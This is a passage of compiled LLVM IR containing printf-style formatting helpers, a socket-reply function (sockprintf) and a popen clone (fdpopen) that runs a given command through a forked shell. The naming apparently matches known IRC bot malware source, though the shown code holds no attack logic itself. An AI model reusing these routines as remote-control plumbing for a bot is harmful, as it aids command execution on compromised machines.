  %34 = ashr exact i64 %sext34, 32
  %35 = getelementptr inbounds i8, i8* %0, i64 %34
  store i8 0, i8* %35, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #0 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #0 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %9 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %10 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %11 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %12 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %13 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %14 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %15 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %16 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %17 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %18 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %19 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %20 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %21 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %22 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %23 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  %24 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  br label %25

; <label>:25:                                     ; preds = %153, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %153 ]
  %.0 = phi i8* [ %1, %3 ], [ %154, %153 ]
  %26 = load i8, i8* %.0, align 1
  switch i8 %26, label %149 [
    i8 0, label %155
    i8 37, label %27
  ]

; <label>:27:                                     ; preds = %25
  %28 = getelementptr inbounds i8, i8* %.0, i64 1
  %29 = load i8, i8* %28, align 1
  switch i8 %29, label %.preheader70 [
    i8 0, label %155
    i8 37, label %149
    i8 45, label %30
  ]

; <label>:30:                                     ; preds = %27
  %31 = getelementptr inbounds i8, i8* %.0, i64 2
  br label %.preheader70

.preheader70:                                     ; preds = %30, %27
  %.063.ph = phi i32 [ 0, %27 ], [ 1, %30 ]
  %.1.ph = phi i8* [ %28, %27 ], [ %31, %30 ]
  %32 = load i8, i8* %.1.ph, align 1
  %33 = icmp eq i8 %32, 48
  br i1 %33, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %37, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %36, %.preheader.loopexit ]
  %34 = load i8, i8* %.1.lcssa, align 1
  %.off74 = add i8 %34, -48
  %35 = icmp ult i8 %.off74, 10
  br i1 %35, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %36, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %37, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %36 = getelementptr inbounds i8, i8* %.172, i64 1
  %37 = or i32 %.06371, 2
  %38 = load i8, i8* %36, align 1
  %39 = icmp eq i8 %38, 48
  br i1 %39, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %40 = phi i8 [ %46, %.lr.ph77 ], [ %34, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %45, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %44, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %41 = zext i8 %40 to i32
  %42 = mul nsw i32 %.06475, 10
  %43 = add i32 %42, -48
  %44 = add i32 %43, %41
  %45 = getelementptr inbounds i8, i8* %.276, i64 1
  %46 = load i8, i8* %45, align 1
  %.off = add i8 %46, -48
  %47 = icmp ult i8 %.off, 10
  br i1 %47, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %44, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %45, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %34, %.preheader ], [ %46, %.critedge.loopexit ]
  switch i8 %.lcssa, label %153 [
    i8 115, label %48
    i8 100, label %68
    i8 120, label %84
    i8 88, label %100
    i8 117, label %116
    i8 99, label %132
  ]

; <label>:48:                                     ; preds = %.critedge
  %49 = load i32, i32* %5, align 8
  %50 = icmp ult i32 %49, 41
  br i1 %50, label %51, label %56

; <label>:51:                                     ; preds = %48
  %52 = load i8*, i8** %6, align 8
  %53 = sext i32 %49 to i64
  %54 = getelementptr i8, i8* %52, i64 %53
  %55 = add i32 %49, 8
  store i32 %55, i32* %5, align 8
  br label %59

; <label>:56:                                     ; preds = %48
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr i8, i8* %57, i64 8
  store i8* %58, i8** %7, align 8
  br label %59

; <label>:59:                                     ; preds = %56, %51
  %.in69 = phi i8* [ %54, %51 ], [ %57, %56 ]
  %60 = bitcast i8* %.in69 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = sext i32 %61 to i64
  %63 = inttoptr i64 %62 to i8*
  %64 = icmp ne i32 %61, 0
  %65 = select i1 %64, i8* %63, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.88, i64 0, i64 0)
  %66 = tail call fastcc i32 @prints(i8** %0, i8* %65, i32 %.064.lcssa, i32 %.063.lcssa)
  %67 = add nsw i32 %66, %.061
  br label %153

; <label>:68:                                     ; preds = %.critedge
  %69 = load i32, i32* %8, align 8
  %70 = icmp ult i32 %69, 41
  br i1 %70, label %71, label %76

; <label>:71:                                     ; preds = %68
  %72 = load i8*, i8** %9, align 8
  %73 = sext i32 %69 to i64
  %74 = getelementptr i8, i8* %72, i64 %73
  %75 = add i32 %69, 8
  store i32 %75, i32* %8, align 8
  br label %79

; <label>:76:                                     ; preds = %68
  %77 = load i8*, i8** %10, align 8
  %78 = getelementptr i8, i8* %77, i64 8
  store i8* %78, i8** %10, align 8
  br label %79

; <label>:79:                                     ; preds = %76, %71
  %.in68 = phi i8* [ %74, %71 ], [ %77, %76 ]
  %80 = bitcast i8* %.in68 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = tail call fastcc i32 @printi(i8** %0, i32 %81, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %83 = add nsw i32 %82, %.061
  br label %153

; <label>:84:                                     ; preds = %.critedge
  %85 = load i32, i32* %11, align 8
  %86 = icmp ult i32 %85, 41
  br i1 %86, label %87, label %92

; <label>:87:                                     ; preds = %84
  %88 = load i8*, i8** %12, align 8
  %89 = sext i32 %85 to i64
  %90 = getelementptr i8, i8* %88, i64 %89
  %91 = add i32 %85, 8
  store i32 %91, i32* %11, align 8
  br label %95

; <label>:92:                                     ; preds = %84
  %93 = load i8*, i8** %13, align 8
  %94 = getelementptr i8, i8* %93, i64 8
  store i8* %94, i8** %13, align 8
  br label %95

; <label>:95:                                     ; preds = %92, %87
  %.in67 = phi i8* [ %90, %87 ], [ %93, %92 ]
  %96 = bitcast i8* %.in67 to i32*
  %97 = load i32, i32* %96, align 4
  %98 = tail call fastcc i32 @printi(i8** %0, i32 %97, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %99 = add nsw i32 %98, %.061
  br label %153

; <label>:100:                                    ; preds = %.critedge
  %101 = load i32, i32* %14, align 8
  %102 = icmp ult i32 %101, 41
  br i1 %102, label %103, label %108

; <label>:103:                                    ; preds = %100
  %104 = load i8*, i8** %15, align 8
  %105 = sext i32 %101 to i64
  %106 = getelementptr i8, i8* %104, i64 %105
  %107 = add i32 %101, 8
  store i32 %107, i32* %14, align 8
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i8*, i8** %16, align 8
  %110 = getelementptr i8, i8* %109, i64 8
  store i8* %110, i8** %16, align 8
  br label %111

; <label>:111:                                    ; preds = %108, %103
  %.in66 = phi i8* [ %106, %103 ], [ %109, %108 ]
  %112 = bitcast i8* %.in66 to i32*
  %113 = load i32, i32* %112, align 4
  %114 = tail call fastcc i32 @printi(i8** %0, i32 %113, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %115 = add nsw i32 %114, %.061
  br label %153

; <label>:116:                                    ; preds = %.critedge
  %117 = load i32, i32* %17, align 8
  %118 = icmp ult i32 %117, 41
  br i1 %118, label %119, label %124

; <label>:119:                                    ; preds = %116
  %120 = load i8*, i8** %18, align 8
  %121 = sext i32 %117 to i64
  %122 = getelementptr i8, i8* %120, i64 %121
  %123 = add i32 %117, 8
  store i32 %123, i32* %17, align 8
  br label %127

; <label>:124:                                    ; preds = %116
  %125 = load i8*, i8** %19, align 8
  %126 = getelementptr i8, i8* %125, i64 8
  store i8* %126, i8** %19, align 8
  br label %127

; <label>:127:                                    ; preds = %124, %119
  %.in65 = phi i8* [ %122, %119 ], [ %125, %124 ]
  %128 = bitcast i8* %.in65 to i32*
  %129 = load i32, i32* %128, align 4
  %130 = tail call fastcc i32 @printi(i8** %0, i32 %129, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %131 = add nsw i32 %130, %.061
  br label %153

; <label>:132:                                    ; preds = %.critedge
  %133 = load i32, i32* %20, align 8
  %134 = icmp ult i32 %133, 41
  br i1 %134, label %135, label %140

; <label>:135:                                    ; preds = %132
  %136 = load i8*, i8** %21, align 8
  %137 = sext i32 %133 to i64
  %138 = getelementptr i8, i8* %136, i64 %137
  %139 = add i32 %133, 8
  store i32 %139, i32* %20, align 8
  br label %143

; <label>:140:                                    ; preds = %132
  %141 = load i8*, i8** %24, align 8
  %142 = getelementptr i8, i8* %141, i64 8
  store i8* %142, i8** %24, align 8
  br label %143

; <label>:143:                                    ; preds = %140, %135
  %.in = phi i8* [ %138, %135 ], [ %141, %140 ]
  %144 = bitcast i8* %.in to i32*
  %145 = load i32, i32* %144, align 4
  %146 = trunc i32 %145 to i8
  store i8 %146, i8* %22, align 1
  store i8 0, i8* %23, align 1
  %147 = call fastcc i32 @prints(i8** %0, i8* nonnull %22, i32 %.064.lcssa, i32 %.063.lcssa)
  %148 = add nsw i32 %147, %.061
  br label %153

; <label>:149:                                    ; preds = %27, %25
  %.3 = phi i8* [ %.0, %25 ], [ %28, %27 ]
  %150 = load i8, i8* %.3, align 1
  %151 = zext i8 %150 to i32
  tail call fastcc void @printchar(i8** %0, i32 %151)
  %152 = add nsw i32 %.061, 1
  br label %153

; <label>:153:                                    ; preds = %.critedge, %149, %143, %127, %111, %95, %79, %59
  %.162 = phi i32 [ %152, %149 ], [ %67, %59 ], [ %83, %79 ], [ %99, %95 ], [ %115, %111 ], [ %131, %127 ], [ %148, %143 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %149 ], [ %.2.lcssa, %59 ], [ %.2.lcssa, %79 ], [ %.2.lcssa, %95 ], [ %.2.lcssa, %111 ], [ %.2.lcssa, %127 ], [ %.2.lcssa, %143 ], [ %.2.lcssa, %.critedge ]
  %154 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %25

; <label>:155:                                    ; preds = %27, %25
  %156 = icmp eq i8** %0, null
  br i1 %156, label %159, label %157

; <label>:157:                                    ; preds = %155
  %158 = load i8*, i8** %0, align 8
  store i8 0, i8* %158, align 1
  br label %159

; <label>:159:                                    ; preds = %155, %157
  %160 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %160)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #0 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #0 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #0 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #5
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #0 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #0 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #5
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #15
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i64 0, i64 0), i8* %5)
  %12 = call i64 @strlen(i8* %5) #15
  %13 = call i64 @send(i32 %0, i8* %5, i64 %12, i32 16384) #5
  %14 = trunc i64 %13 to i32
  call void @free(i8* %5) #5
  ret i32 %14
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #3

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #6

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8* nocapture readonly) local_unnamed_addr #0 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %78 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %78

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #5
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %78, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #5
  %18 = icmp slt i32 %17, 1
  br i1 %18, label %78, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #5
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %78, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #16
  switch i32 %27, label %61 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #5
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #5
  br label %78

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #5
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #5
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #5
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #5
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #5
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #5
  br label %59

; <label>:59:                                     ; preds = %55, %45
  %60 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i64 0, i64 0), i8* %0, i8* null) #5
  call void @_exit(i32 127) #17
  unreachable

; <label>:61:                                     ; preds = %26
  %62 = load i8, i8* %1, align 1
  %63 = icmp eq i8 %62, 114
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %10, align 4
  %66 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @close(i32 %67) #5
  br label %74

; <label>:69:                                     ; preds = %61
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = load i32, i32* %10, align 4
  %73 = call i32 @close(i32 %72) #5
  br label %74

; <label>:74:                                     ; preds = %69, %64
  %.011 = phi i32 [ %65, %64 ], [ %71, %69 ]
  %75 = load i32*, i32** @fdopen_pids, align 8
  %76 = sext i32 %.011 to i64
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  store i32 %27, i32* %77, align 4
  br label %78

; <label>:78:                                     ; preds = %19, %16, %9, %5, %2, %74, %28
  %.0 = phi i32 [ %.011, %74 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #3

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

